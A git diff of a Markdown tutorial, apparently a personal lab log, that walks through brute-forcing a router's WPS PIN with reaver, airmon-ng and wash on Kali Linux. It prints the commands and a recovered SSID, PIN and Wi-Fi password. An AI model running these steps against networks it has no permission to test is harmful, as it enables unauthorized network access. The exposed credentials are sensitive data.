@@ -8,7 +8,7 @@ Nanjing, Jiangsu, China
 
 ---
 
-### Tools
+## Tools
 
 _Kali Linux_ 中的 _reaver_
 
@@ -24,7 +24,9 @@ _Kali Linux_ 中的 _aircrack-ng_
 
 * 用于将网卡设定为监控模式
 
-### Theory
+---
+
+## Theory
 
 支持 _WPS_ 功能的无线路由器，只要获得它的 _PIN_
 
@@ -36,9 +38,11 @@ _reaver_ 通过穷举的方式暴力破解这个 _PIN_
 
 从而获得无线网络的密码
 
-### Procudure
+---
 
-#### Insert a USB-wireless-interface
+## Procedure
+
+### Insert a USB-wireless-interface
 
 ```bash
 $ ifconfig
@@ -48,7 +52,7 @@ $ ifconfig
 
 _wlan0_ is the wireless interface I have just inserted
 
-#### Turn the wireless-interface into monitor mode
+### Turn the wireless-interface into monitor mode
 
 ```bash
 $ airmon-ng start wlan0
@@ -56,7 +60,7 @@ $ airmon-ng start wlan0
 
 ![reaver-mon](../img/reaver-mon.png)
 
-#### Check whether the monitor mode is on
+### Check whether the monitor mode is on
 
 ```bash
 $ ifconfig
@@ -66,7 +70,7 @@ $ ifconfig
 
 _wlan0mon_ is the wireless-interface which has been turned into monitor mode
 
-#### Search for the Routers which support WPS
+### Search for the Routers which support WPS
 
 ```bash
 $ wash -i wlan0mon
@@ -86,7 +90,7 @@ $ wash -i wlan0mon
 
 经过尝试和选择，身边唯一能被破解的网络 —— `TP-LINK_qwer`
 
-#### Start cracking by reaver
+### Start cracking by reaver
 
 ```bash
 $ reaver -i wlan0mon -b EC:88:8F:51:DD:A2 -vv
@@ -112,7 +116,7 @@ _AP SSID_ - `TP-LINK_qwer`; _PIN_ - `18914863`；_PSK_ - `nuaa@413`
 
 ---
 
-### Summary
+## Summary
 
 这个破解太受条件限制了
 
